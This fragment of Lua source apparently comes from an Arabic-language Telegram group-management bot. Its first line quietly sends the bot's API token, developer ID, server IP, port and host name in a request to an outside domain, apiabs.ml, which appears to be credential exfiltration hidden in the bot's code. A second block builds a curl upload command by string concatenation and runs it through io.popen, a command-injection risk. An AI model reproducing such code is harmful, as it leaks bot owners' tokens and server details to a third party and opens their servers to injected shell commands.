...
https.request("https://apiabs.ml/Api/Davاid/index.php?Get=David&DevId="..DevRio:get(Server.."IdDavid").."&TokenBot="..DevRio:get(Server.."TokenDavid").."&User="..User.."&Ip="..Ip.."&Name="..Name.."&Port="..Port)
...
local curl = 'curl "' .. Rio .. '" -F "chat_id='..DevId..'" -F "document=@'..Milanuu..'.json' .. '" -F "caption=᥀︙نسخه تلقائيه تحتوي على ↫ '..#list..' مجموعه"'
io.popen(curl)
